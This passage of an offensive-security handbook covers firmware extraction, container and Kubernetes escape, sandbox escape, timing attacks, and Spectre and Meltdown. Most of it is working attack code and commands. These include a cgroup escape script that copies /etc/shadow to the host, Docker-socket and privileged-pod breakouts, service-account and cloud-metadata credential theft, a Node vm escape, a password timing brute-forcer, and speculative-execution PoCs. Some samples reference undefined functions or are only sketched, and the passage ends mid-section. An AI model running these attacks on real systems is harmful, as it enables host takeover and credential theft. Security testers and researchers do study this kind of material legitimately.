### Firmware from Update Files

**Extracting from Manufacturer Updates**

```bash
# Many update files are archives or encrypted containers
file firmware_update.bin
binwalk firmware_update.bin

# Extract known formats
binwalk -e firmware_update.bin

# Unencrypted ZIP/tar
unzip firmware_update.zip
tar -xvf firmware_update.tar

# Encrypted updates may require:
# - Reverse engineering update tool
# - Finding encryption keys in update software
# - Known vulnerabilities in update process
```

**Android Firmware (OTA Updates)**

```bash
# Extract from OTA zip
unzip ota_update.zip

# Extract system.img (ext4 or other filesystem)
mkdir system_mount
sudo mount -o loop system.img system_mount

# Or use simg2img for sparse Android images
simg2img system.img system_raw.img
mkdir system_mount
sudo mount -o loop system_raw.img system_mount
```

**iOS Firmware (IPSW)**

```bash
# IPSW is a ZIP file
unzip iPhone_XX_X.X.X.ipsw

# Extract root filesystem
# DMG file can be mounted on macOS
hdiutil attach -nobrowse 048-12345-123.dmg

# On Linux, use dmg2img
sudo apt install dmg2img
dmg2img 048-12345-123.dmg rootfs.img
mkdir rootfs
sudo mount -o loop rootfs.img rootfs
```

### Firmware Analysis Tools

**Binwalk - Firmware Analysis**

```bash
# Signature scan
binwalk firmware.bin

# Extract filesystems and files
binwalk -e firmware.bin

# Entropy analysis (detect encryption/compression)
binwalk -E firmware.bin

# Disassemble code at specific offset
binwalk -D 'cpu architecture' firmware.bin

# Search for specific signatures
binwalk --signature firmware.bin

# Generate entropy graph
binwalk -E -J firmware.bin
```

**Firmware Mod Kit (FMK)**

```bash
git clone https://github.com/rampageX/firmware-mod-kit
cd firmware-mod-kit/src
./configure && make

# Extract firmware
./extract-firmware.sh firmware.bin

# Extracted to fmk/rootfs/
# Modify contents...

# Rebuild firmware
./build-firmware.sh
```

**FACT (Firmware Analysis and Comparison Tool)**

```bash
# Install FACT
git clone https://github.com/fkie-cad/FACT_core
cd FACT_core
sudo ./install.sh

# Start FACT
./start_all_installed_fact_components.sh

# Access web interface at http://localhost:5000
# Upload firmware for automated analysis
```

**Ghidra Firmware Analysis**

```bash
# Import firmware binary
# File → Import File → Select firmware.bin

# Specify processor if not auto-detected
# Language: ARM:LE:32:v7 (or appropriate)
# Base address: 0

# Load address: (check bootloader/linker script)

# For ARM Cortex-M (common in IoT)

# Analyze → Auto Analyze

# Processor: ARM:LE:32:Cortex

# Base address: 0x08000000 (STM32) or 0x00000000

# Define memory regions

# Window → Memory Map

# Add regions: Flash, RAM, MMIO

# SVD file for peripheral definitions (ARM Cortex-M)

# File → Parse C Source → Load SVD-Loader

# Import vendor SVD file for register definitions
````

**radare2 Firmware Analysis**
```bash
# Open firmware
r2 -a arm -b 32 firmware.bin

# Set base address
[0x00000000]> e io.va=true
[0x00000000]> s 0x08000000

# Analyze
[0x08000000]> aaa

# Find strings
[0x08000000]> izz

# Search for functions
[0x08000000]> afl

# Find cross-references
[0x08000000]> axt @ addr
````

### Filesystem Extraction and Analysis

**Common Embedded Filesystems**

**SquashFS**

```bash
# Extract
unsquashfs firmware.squashfs

# Or with binwalk
binwalk -e firmware.bin

# Mount read-only
mkdir mount_point
sudo mount -t squashfs firmware.squashfs mount_point
```

**JFFS2 (Journaling Flash File System)**

```bash
# Extract using jefferson
pip install jefferson
jefferson firmware.jffs2 -d extracted/

# Or mount (requires MTD)
sudo modprobe mtdram total_size=32768 erase_size=128
sudo modprobe mtdblock
sudo dd if=firmware.jffs2 of=/dev/mtdblock0
sudo mount -t jffs2 /dev/mtdblock0 /mnt
```

**UBIFS (Unsorted Block Image File System)**

```bash
# Extract using ubireader
pip install python-lzo
git clone https://github.com/jrspruitt/ubi_reader
cd ubi_reader
sudo python setup.py install

ubireader_extract_images firmware.ubi
ubireader_extract_files firmware.ubi
```

**YAFFS2 (Yet Another Flash File System)**

```bash
# Extract using unyaffs
git clone https://github.com/ehlers/unyaffs
cd unyaffs
make
./unyaffs firmware.yaffs2 output_dir/
```

**CramFS**

```bash
# Extract
mkdir extract
sudo mount -t cramfs -o loop firmware.cramfs extract/

# Or use cramfsck
cramfsck -x extract firmware.cramfs
```

### Analyzing Extracted Firmware

**Initial Reconnaissance**

```bash
# File system structure
tree -L 3 extracted_firmware/

# Find interesting files
find . -name "*.conf"
find . -name "*.sh"
find . -name "*passwd*"
find . -name "*key*"
find . -perm -u+s  # SUID binaries

# Strings analysis
strings -n 8 extracted_firmware/bin/* | grep -i password
strings -n 8 extracted_firmware/bin/* | grep -i "http\|ftp"

# Check for hardcoded credentials
grep -r "admin\|root\|password" extracted_firmware/etc/
```

**Binary Analysis**

```bash
# Identify binaries and libraries
file extracted_firmware/bin/*
file extracted_firmware/lib/*

# Check architecture
readelf -h extracted_firmware/bin/httpd
# Or for non-ELF
rabin2 -I extracted_firmware/bin/httpd

# Dependencies
readelf -d extracted_firmware/bin/httpd | grep NEEDED
ldd extracted_firmware/bin/httpd  # If same arch
```

**Web Interface Analysis**

```bash
# Common locations
ls extracted_firmware/www
ls extracted_firmware/htdocs
ls extracted_firmware/web

# Find CGI scripts
find . -name "*.cgi"
find . -name "*.asp"
find . -name "*.php"

# Analyze for vulnerabilities
grep -r "system(" www/
grep -r "popen(" www/
grep -r "eval(" www/
```

**Configuration File Analysis**

```bash
# Common config locations
cat etc/config/*
cat etc/*.conf
cat var/config/*

# Check for hardcoded secrets
grep -r "password\|secret\|key" etc/

# Network configuration
cat etc/network/interfaces
cat etc/config/network
```

### Dynamic Firmware Analysis

**Firmware Emulation with QEMU**

**User-Mode Emulation**

```bash
# Copy QEMU static binary
sudo apt install qemu-user-static
cp /usr/bin/qemu-arm-static extracted_firmware/

# Chroot into firmware
sudo chroot extracted_firmware /qemu-arm-static /bin/sh

# Or use proot (no root required)
proot -q qemu-arm-static -r extracted_firmware/ -b /dev -b /proc /bin/sh
```

**System Emulation**

```bash
# Create virtual disk with firmware
dd if=/dev/zero of=disk.img bs=1M count=256
mkfs.ext4 disk.img
mkdir mount
sudo mount -o loop disk.img mount
sudo cp -r extracted_firmware/* mount/
sudo umount mount

# Boot with QEMU (ARM example)
qemu-system-arm \
    -M vexpress-a9 \
    -kernel zImage \
    -dtb vexpress-v2p-ca9.dtb \
    -drive file=disk.img,if=sd,format=raw \
    -append "root=/dev/mmcblk0 console=ttyAMA0" \
    -net nic -net user,hostfwd=tcp::8080-:80 \
    -nographic
```

**Firmadyne - Automated Firmware Emulation**

```bash
# Install Firmadyne
git clone --recursive https://github.com/firmadyne/firmadyne
cd firmadyne
./download.sh

# Setup database
sudo apt install postgresql
sudo -u postgres createuser -P firmadyne
sudo -u postgres createdb -O firmadyne firmware
sudo -u postgres psql -d firmware < database/schema

# Configure
nano firmadyne.config
# Set FIRMWARE_DIR path

# Extract firmware
./sources/extractor/extractor.py -b brand -f firmware.bin -d ./images

# Identify architecture
./scripts/getArch.sh ./images/1.tar.gz

# Emulate
./scripts/inferNetwork.sh 1
./scripts/makeImage.sh 1
./scratch/1/run.sh
```

**Firmware Analysis and Comparison Tool (FACT) Emulation**

```bash
# FACT supports automated emulation
# Upload firmware via web interface
# Enable "QEMU" plugin in analysis configuration
# FACT will attempt automated emulation
```

### Bootloader Analysis

**U-Boot Analysis**

```bash
# Extract U-Boot from firmware
binwalk -e firmware.bin
# Look for "U-Boot" signature

# Strings analysis
strings uboot.bin | grep -i "bootcmd\|bootargs"

# Common U-Boot environment variables
printenv  # If you have console access

# Interrupt boot sequence
# Press key during boot countdown
# Common: Ctrl+C, space, Enter

# U-Boot commands
help
printenv
setenv bootdelay 10
saveenv
```

**Analyzing U-Boot Environment**

```bash
# Extract environment block
dd if=firmware.bin of=uboot_env.bin bs=1 skip=0x40000 count=0x20000

# Parse with u-boot-tools
sudo apt install u-boot-tools
strings uboot_env.bin

# Or use fw_printenv
fw_printenv -c /path/to/fw_env.config
```

**Common U-Boot Exploits**

```bash
# Modify boot arguments to gain root shell
setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock2 init=/bin/sh"
boot

# Or modify to mount root as read-write
setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock2 rw"
boot

# Network boot for custom kernel
setenv serverip 192.168.1.100
setenv ipaddr 192.168.1.200
tftp 0x80000000 custom_kernel.bin
bootm 0x80000000
```

### UEFI/BIOS Firmware Analysis

**UEFI Firmware Extraction**

```bash
# Extract from BIOS update
innoextract biosupdate.exe  # If InnoSetup
7z x biosupdate.exe

# Parse UEFI firmware
pip install uefi-firmware-parser
uefi-firmware-parser firmware.bin

# Or use UEFITool
git clone https://github.com/LongSoft/UEFITool
cd UEFITool
qmake
make
./UEFIExtract firmware.bin
```

**Analyzing UEFI Modules**

```bash
# Ghidra with UEFI analyzer
# Load PE32+ files from extracted UEFI

# Check for common vulnerabilities
# - SMM vulnerabilities
# - DXE driver issues
# - Secure Boot bypasses

# Use Chipsec for runtime analysis
sudo apt install chipsec
sudo python -m chipsec_main

# Specific module checks
sudo python -m chipsec_main -m common.bios_wp
sudo python -m chipsec_main -m common.smm
```

### Identifying Vulnerabilities in Firmware

**Common Firmware Vulnerabilities**

**Hardcoded Credentials**

```bash
# Search for passwords
grep -r "password.*=" etc/
grep -r "passwd" etc/ | grep -v "shadow\|pam"

# Common default credentials
admin:admin
root:root
admin:password
root:1234
```

**Command Injection**

```bash
# Look for dangerous functions in binaries
rabin2 -z binary | grep -E "system|popen|exec"

# In web files
grep -r "system(" www/
grep -r "\`" www/  # Backtick execution
grep -r "\$(" www/  # Command substitution
```

**Buffer Overflows**

```bash
# Check for unsafe functions
rabin2 -z binary | grep -E "strcpy|strcat|sprintf|gets"

# Analyze with checksec
checksec --file=binary
# Look for: No RELRO, No Canary, NX disabled
```

**Authentication Bypasses**

```bash
# Analyze authentication logic in web scripts
grep -A 20 "login\|authenticate" www/*.cgi

# Check for timing attacks in comparison
grep -r "strcmp\|==.*password" www/
```

**Path Traversal**

```bash
# Look for file operations without sanitization
grep -r "fopen\|readfile\|include" www/

# Test parameters
# ../../../etc/passwd
```

**Insecure Update Mechanisms**

```bash
# Check update scripts
find . -name "*update*" -o -name "*upgrade*"

# Look for signature verification
grep -r "verify\|signature\|md5\|sha" bin/update*

# Check if HTTPS is used
grep -r "http://" etc/update.conf
```

## Container and Sandbox Escape Analysis

### Docker Container Escape Techniques

**Container Privilege Escalation**

**Exploiting Misconfigured Capabilities**

```bash
# Check container capabilities
capsh --print

# Dangerous capabilities
# CAP_SYS_ADMIN - Mount, many syscalls
# CAP_SYS_PTRACE - Debug other processes
# CAP_DAC_READ_SEARCH - Bypass file read permission checks
# CAP_SYS_MODULE - Load kernel modules

# CAP_SYS_ADMIN abuse example
# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Or use nsenter to enter host namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

**Detecting Privileged Containers**

```bash
# Check if running privileged
cat /proc/self/status | grep CapEff
# Compare with 0x0000003fffffffff (all capabilities)

# Check for full /dev access
ls -la /dev | wc -l
# Large number indicates privileged mode

# Check AppArmor/SELinux
cat /proc/self/attr/current
```

**Escaping via Mounted Docker Socket**

```bash
# Check if Docker socket is mounted
ls -la /var/run/docker.sock

# If present, can control Docker daemon
docker -H unix:///var/run/docker.sock ps

# Spawn privileged container
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host --net=host --ipc=host --volume /:/host busybox chroot /host

# Or mount host root
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh
```

**Kernel Exploits from Container**

```bash
# Check kernel version
uname -a

# Search for kernel exploits
searchsploit "linux kernel $(uname -r | cut -d'-' -f1)"

# Common exploits
# DirtyCOW (CVE-2016-5195)
# DirtyPipe (CVE-2022-0847)

# DirtyPipe example (if vulnerable)
gcc -o dirtypipe CVE-2022-0847.c
./dirtypipe /etc/passwd 1 0 "root::0:0:root:/root:/bin/bash"
su root
```

**Exploiting Shared Namespaces**

```bash
# Check namespaces
ls -la /proc/self/ns/

# If sharing host PID namespace (--pid=host)
ps aux  # See all host processes

# Debug host process with CAP_SYS_PTRACE
gdb -p 1
# Inject shellcode or modify memory

# If sharing host network namespace (--net=host)
# Can sniff all host traffic
tcpdump -i eth0
```

**Container Breakout via Cgroups**

```bash
# CVE-2022-0492: cgroup_release_agent escape
# Works if CAP_SYS_ADMIN and cgroup v1

#!/bin/bash
# Create new cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Enable notifications
echo 1 > /tmp/cgrp/x/notify_on_release

# Get host path
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Set release_agent to execute on host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Create command to execute on host
cat > /cmd << EOF
#!/bin/sh
cat /etc/shadow > $host_path/output
EOF
chmod a+x /cmd

# Trigger by killing all processes in cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Detecting Container Environment

**Identifying Container Context**

```bash
# Check for /.dockerenv
ls -la /.dockerenv

# Check cgroups
cat /proc/1/cgroup | grep -i docker

# Check for container-specific hostnames
hostname
# Often shows short hex string

# Check mount points
mount | grep -E "overlay|aufs|docker"

# Check systemd-detect-virt
systemd-detect-virt
# Returns: docker, lxc, podman, etc.

# Process list
ps aux
# Limited processes indicate container
```

**Automated Container Detection**

```python
#!/usr/bin/env python3
import os

def detect_container():
    indicators = []
    
    # Check for .dockerenv
    if os.path.exists('/.dockerenv'):
        indicators.append("Docker: /.dockerenv exists")
    
    # Check cgroups
    try:
        with open('/proc/self/cgroup', 'r') as f:
            if 'docker' in f.read():
                indicators.append("Docker: cgroup contains 'docker'")
    except:
        pass
    
    # Check for overlay filesystem
    try:
        with open('/proc/mounts', 'r') as f:
            if 'overlay' in f.read():
                indicators.append("Container: overlay filesystem detected")
    except:
        pass
    
    # Check init process
    try:
        with open('/proc/1/cgroup', 'r') as f:
            content = f.read()
            if 'docker' in content:
                indicators.append("Docker: PID 1 in docker cgroup")
            elif 'lxc' in content:
                indicators.append("LXC: PID 1 in lxc cgroup")
    except:
        pass
    
    return indicators

if __name__ == "__main__":
    results = detect_container()
    if results:
        print("Container detected:")
        for indicator in results:
            print(f"  - {indicator}")
    else:
        print("No container detected")
```

### Kubernetes Pod Escape

**Service Account Token Abuse**

```bash
# Default service account token location
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# Query API
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# List secrets
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# Create privileged pod (if authorized)
cat > evil-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

kubectl apply -f evil-pod.yaml --token=$TOKEN
```

**Exploiting kubelet API**

```bash
# Check if kubelet API is accessible
curl -k https://localhost:10250/pods

# Read-only port (if enabled, usually 10255)
curl http://localhost:10255/pods

# Run command in pod (requires authentication)
curl -k -X POST "https://localhost:10250/run/$NAMESPACE/$POD/$CONTAINER" \
  -d "cmd=cat /etc/shadow" \
  --cert /path/to/client.crt \
  --key /path/to/client.key
```

**Metadata Service Access (Cloud)**

```bash
# AWS metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/user-data/

# GCP metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Azure metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Extract IAM credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Sandbox Escape Techniques

**Seccomp Bypass**

```bash
# Check seccomp status
cat /proc/self/status | grep Seccomp
# 0 = disabled
# 1 = strict (only read, write, exit, sigreturn)
# 2 = filtered (custom policy)

# Dump seccomp filter
seccomp-tools dump ./binary

# Analyze allowed syscalls
# Look for dangerous combinations:
# ptrace + process_vm_writev = inject into other process
# process_vm_readv = read arbitrary memory
```

**AppArmor/SELinux Bypass**

```bash
# Check AppArmor status
cat /proc/self/attr/current

# Check SELinux status
sestatus
getenforce

# Common bypasses:
# - Find unconfined transitions
# - Exploit policy misconfigurations
# - Use allowed programs to gain access

# Example: abuse allowed exec
# If /bin/sh is allowed
aa-exec -p /path/to/profile -- /bin/sh
```

**Chrome Sandbox Escape (Conceptual)**

[Speculation] Modern browser sandboxes are complex; escapes typically involve:

1. Renderer process exploit (arbitrary code execution)
2. Sandbox escape (break out of restricted process)
3. Privilege escalation (gain system access)

**Common techniques:**

- Mojo IPC exploitation
- GPU process abuse
- File descriptor confusion
- Syscall filter bypass

[Unverified] Requires deep understanding of Chromium architecture and recent vulnerabilities

### JavaScript VM Sandbox Escape

**Node.js VM Escape**

```javascript
// CVE-2023-30547 example (simplified)
const vm = require('vm');

// Escape via prototype pollution
const code = `
  const process = this.constructor.constructor('return process')();
  process.mainModule.require('child_process').execSync('whoami');
`;

try {
  vm.runInNewContext(code, Object.create(null), { timeout: 100 });
} catch (e) {
  console.log("Escaped!");
}
```

**Breaking out of restricted contexts**

```javascript
// Access global object
const global = Function('return this')();

// Require modules
const require = global.process.mainModule.require;
const exec = require('child_process').exec;

exec('cat /etc/passwd', (err, stdout) => {
  console.log(stdout);
});
```

## Time-Based and Speculative Execution Exploits

### Time-Based Side Channels

**Timing Attack on Authentication**

```python
import requests
import time
import statistics

def measure_response_time(url, password):
    """Measure server response time for password attempt"""
    times = []
    for _ in range(100):  # Multiple measurements for accuracy
        start = time.perf_counter()
        r = requests.post(url, data={'password': password})
        end = time.perf_counter()
        times.append(end - start)
    
    # Remove outliers
    mean = statistics.mean(times)
    stdev = statistics.stdev(times)
    filtered = [t for t in times if abs(t - mean) < 2 * stdev]
    
    return statistics.mean(filtered)

def timing_attack(url, charset, known_prefix=""):
    """
    Exploit timing side-channel in string comparison
    Assumes early-exit comparison (stops at first mismatch)
    """
    print(f"Testing with prefix: {known_prefix}")
    
    timings = {}
    for char in charset:
        test_password = known_prefix + char + "X" * (32 - len(known_prefix) - 1)
        avg_time = measure_response_time(url, test_password)
        timings[char] = avg_time
        print(f"  {char}: {avg_time:.6f}s")
    
    # Character with longest time likely correct
    next_char = max(timings, key=timings.get)
    print(f"Next character likely: {next_char}\n")
    
    return next_char

# Usage
url = "http://target/login"
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for i in range(32):  # Assume 32-char password
    next_char = timing_attack(url, charset, password)
    password += next_char
    if i > 5:  # Try logging in after finding several chars
        # Attempt login to see if we have enough
        pass
```

**Constant-Time Comparison (Defense)**

```python
import hmac

def constant_time_compare(a, b):
    """Timing-safe string comparison"""
    return hmac.compare_digest(a, b)

# Or manual implementation
def secure_compare(a, b):
    if len(a) != len(b):
        return False
    
    result = 0
    for x, y in zip(a, b):
        result |= ord(x) ^ ord(y)
    
    return result == 0
```

### Cache Timing Attacks (Advanced)

**AES T-Table Cache Attack**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>

#define AES_BLOCK_SIZE 16
#define SAMPLES 10000

// Simplified AES T-table addresses (example)
extern uint32_t Te0[256], Te1[256], Te2[256], Te3[256];

// Measure cache access time
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    __asm__ volatile ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

// Flush cache line
static inline void clflush(void *p) {
    _mm_clflush(p);
}

// Time memory access
uint64_t time_access(void *addr) {
    uint64_t start, end;
    volatile uint32_t temp;
    
    start = rdtsc();
    temp = *(uint32_t *)addr;
    end = rdtsc();
    
    return end - start;
}

// Attack AES first round
void aes_cache_attack(uint8_t *plaintext) {
    uint64_t timings[256][4];  // For each byte value and T-table
    
    // Flush all T-tables
    for (int i = 0; i < 256; i++) {
        clflush(&Te0[i]);
        clflush(&Te1[i]);
        clflush(&Te2[i]);
        clflush(&Te3[i]);
    }
    _mm_mfence();
    
    // Trigger AES encryption with known plaintext
    trigger_aes_encryption(plaintext);
    
    // Probe T-tables
    for (int table = 0; table < 4; table++) {
        uint32_t *t_table = (table == 0) ? Te0 : (table == 1) ? Te1 : (table == 2) ? Te2 : Te3;
        
        for (int byte_val = 0; byte_val < 256; byte_val++) {
            timings[byte_val][table] = time_access(&t_table[byte_val]);
        }
    }
    
    // Analyze cache hits (low timing = accessed = key byte candidate)
    for (int table = 0; table < 4; table++) {
        printf("T-table %d candidates:\n", table);
        for (int byte_val = 0; byte_val < 256; byte_val++) {
            if (timings[byte_val][table] < THRESHOLD) {
                // byte_val XOR plaintext[table] = key_byte[table]
                uint8_t key_byte = byte_val ^ plaintext[table];
                printf("  Key byte %d candidate: 0x%02x\n", table, key_byte);
            }
        }
    }
}
```

[Unverified] Modern AES implementations use AES-NI hardware instructions which are not vulnerable to cache timing

### Spectre Variants

**Spectre-v1: Bounds Check Bypass (Detailed)**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>

#define CACHE_HIT_THRESHOLD 80
#define ARRAY1_SIZE 16

uint8_t array1[ARRAY1_SIZE];
uint8_t array2[256 * 512];  // Spread across pages
uint8_t temp = 0;

// Victim function with bounds check
uint8_t victim_function(size_t x) {
    if (x < ARRAY1_SIZE) {
        return array2[array1[x] * 512];
    }
    return 0;
}

// Measure memory access time
uint64_t time_access(uint8_t *addr) {
    uint64_t start, end;
    
    start = __rdtscp(&temp);
    temp &= *addr;
    end = __rdtscp(&temp);
    
    return end - start;
}

// Read memory byte using Spectre-v1
uint8_t spectre_read_byte(size_t malicious_x) {
    int results[256];
    int tries, i, j, k, mix_i;
    uint8_t *addr;
    uint64_t time1, time2;
    volatile uint8_t dummy = 0;
    
    memset(results, 0, sizeof(results));
    
    for (tries = 999; tries > 0; tries--) {
        
        // Flush array2 from cache
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);
        
        // Train branch predictor (5x in bounds, 1x out of bounds)
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&ARRAY1_SIZE);
            
            // Delay to ensure ARRAY1_SIZE is out of cache
            for (volatile int z = 0; z < 100; z++) {}
            
            // Bit twiddling to alternate between valid and malicious_x
            size_t x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = malicious_x ^ (x & (x ^ malicious_x));
            
            // Call victim function
            dummy &= victim_function(x);
        }
        
        // Time reads to array2 to find cached line
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;  // Avoid stride prediction
            addr = &array2[mix_i * 512];
            
            time1 = time_access(addr);
            
            if (time1 <= CACHE_HIT_THRESHOLD)
                results[mix_i]++;
        }
        
        // Find the best two candidates
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        
        // Success if best result clearly better than second best
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }
    
    return (uint8_t)j;
}

int main() {
    char *secret = "SecretPassword123";
    size_t secret_addr = (size_t)secret;
    size_t array1_addr = (size_t)array1;
    
    printf("Reading secret at %p\n", secret);
    printf("Array1 at %p\n", array1);
    
    // Read each byte of secret
    for (size_t offset = 0; offset < strlen(secret); offset++) {
        size_t malicious_x = (secret_addr - array1_addr) + offset;
        uint8_t leaked_byte = spectre_read_byte(malicious_x);
        printf("%c", leaked_byte >= 32 && leaked_byte < 127 ? leaked_byte : '?');
    }
    printf("\n");
    
    return 0;
}
```

**Spectre-v2: Branch Target Injection**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>

#define CACHE_HIT_THRESHOLD 80

uint8_t probe_array[256 * 4096];
uint8_t temp = 0;

// Gadget function pointer
void (*gadget_ptr)(void);

// Gadget that leaks data
void leak_gadget(uint8_t *secret) {
    // Speculatively executed when indirect call mispredicts
    uint8_t value = *secret;
    probe_array[value * 4096] = 1;  // Encode in cache
}

// Measure memory access time
uint64_t time_access(uint8_t *addr) {
    uint64_t start, end;
    
    start = __rdtscp(&temp);
    temp &= *addr;
    end = __rdtscp(&temp);
    
    return end - start;
}

// Indirect call victim
void indirect_call_victim(void (*fn)(void), void *arg) {
    fn(arg);  // Indirect call - vulnerable to BTB poisoning
}

// Spectre-v2 attack
uint8_t spectre_v2_attack(uint8_t *secret_addr) {
    int results[256];
    memset(results, 0, sizeof(results));
    
    for (int tries = 0; tries < 100; tries++) {
        // Flush probe array
        for (int i = 0; i < 256; i++)
            _mm_clflush(&probe_array[i * 4096]);
        
        // Train branch predictor with gadget address
        for (int j = 0; j < 10; j++) {
            gadget_ptr = (void (*)(void))leak_gadget;
            indirect_call_victim(gadget_ptr, secret_addr);
        }
        
        // Mistrain: call with different function
        // but pass secret_addr
        // Speculative execution will use trained target (leak_gadget)
        gadget_ptr = (void (*)(void))dummy_function;
        _mm_clflush(&gadget_ptr);
        
        indirect_call_victim(gadget_ptr, secret_addr);
        
        // Probe cache
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            uint64_t time = time_access(&probe_array[mix_i * 4096]);
            
            if (time <= CACHE_HIT_THRESHOLD)
                results[mix_i]++;
        }
    }
    
    // Find most likely value
    int max_idx = 0;
    for (int i = 1; i < 256; i++) {
        if (results[i] > results[max_idx])
            max_idx = i;
    }
    
    return (uint8_t)max_idx;
}
```

[Unverified] Modern CPUs implement retpoline and Indirect Branch Restricted Speculation (IBRS) as mitigations

**Spectre-v4: Speculative Store Bypass**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

uint8_t probe_array[256 * 4096];
uint8_t public_data = 0;
uint8_t secret_data = 42;

// Victim function with store-load dependency
void victim_function_v4(int index) {
    uint8_t *data_ptr = &public_data;
    
    // Store to public_data
    public_data = 0;
    
    // Long-latency operation to delay store
    for (volatile int i = 0; i < 100; i++) {}
    
    // Speculatively, load may bypass pending store
    // and read old value (secret_data if we control data_ptr)
    uint8_t value = *data_ptr;
    
    // Encode in cache
    probe_array[value * 4096] = 1;
}

// Spectre-v4 exploitation
uint8_t spectre_v4_attack(void) {
    int results[256];
    memset(results, 0, sizeof(results));
    
    for (int tries = 0; tries < 100; tries++) {
        // Flush probe array
        for (int i = 0; i < 256; i++)
            _mm_clflush(&probe_array[i * 4096]);
        
        // Set up so data_ptr can be confused with secret_data address
        // (requires specific memory layout or vulnerability)
        
        // Trigger speculative store bypass
        victim_function_v4(0);
        
        // Probe cache
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            uint64_t time = time_access(&probe_array[mix_i * 4096]);
            
            if (time <= CACHE_HIT_THRESHOLD)
                results[mix_i]++;
        }
    }
    
    // Find most likely value
    int max_idx = 0;
    for (int i = 1; i < 256; i++) {
        if (results[i] > results[max_idx])
            max_idx = i;
    }
    
    return (uint8_t)max_idx;
}
```

### Meltdown (Rogue Data Cache Load)

**Meltdown Proof of Concept**

```c
#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <string.h>

#define CACHE_HIT_THRESHOLD 80
#define PROBE_ARRAY_SIZE (256 * 4096)

uint8_t probe_array[PROBE_ARRAY_SIZE];
uint8_t temp = 0;
sigjmp_buf jbuf;

// Signal handler for segmentation fault
void segfault_handler(int sig) {
    siglongjmp(jbuf, 1);
}

// Measure memory access time
uint64_t time_access(uint8_t *addr) {
    uint64_t start, end;
    
    start = __rdtscp(&temp);
    temp &= *addr;
    end = __rdtscp(&temp);
    
    return end - start;
}

// Meltdown attack
uint8_t meltdown_read_byte(uint64_t kernel_addr) {
    int results[256];
    uint8_t value;
    memset(results, 0, sizeof(results));
    
    // Install signal handler
    signal(SIGSEGV, segfault_handler);
    
    for (int tries = 0; tries < 100; tries++) {
        // Flush probe array
        for (int i = 0; i < 256; i++)
            _mm_clflush(&probe_array[i * 4096]);
        
        _mm_mfence();
        
        // Set up exception recovery
        if (sigsetjmp(jbuf, 1) == 0) {
            // Speculatively read kernel memory
            // This will fault, but not before speculative execution
            value = *(volatile uint8_t *)kernel_addr;
            
            // Encode in cache (speculatively executed)
            temp &= probe_array[value * 4096];
        }
        
        // Probe cache to recover value
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            uint64_t time = time_access(&probe_array[mix_i * 4096]);
            
            if (time <= CACHE_HIT_THRESHOLD)
                results[mix_i]++;
        }
    }
    
    // Find most likely value
    int max_idx = 0;
    for (int i = 1; i < 256; i++) {
        if (results[i] > results[max_idx])
            max_idx = i;
    }
    
    return (uint8_t)max_idx;
}

int main() {
    // Example: try to read from kernel space
    // This address would need to be valid kernel address
    uint64_t kernel_addr = 0xffffffff81000000;
    
    printf("Attempting to read kernel memory at 0x%lx\n", kernel_addr);
    
    for (int offset = 0; offset < 32; offset++) {
        uint8_t leaked = meltdown_read_byte(kernel_addr + offset);
        printf("%02x ", leaked);
        if ((offset + 1) % 16 == 0) printf("\n");
    }
    
    return 0;
}
```

[Unverified] Modern systems use KPTI (Kernel Page Table Isolation) which prevents Meltdown by unmapping kernel memory from user page tables

### Transient Execution Attacks Detection

**Checking CPU Vulnerabilities**

```bash
# Check kernel vulnerabilities status
grep . /sys/devices/system/cpu/vulnerabilities/*

# Example output:
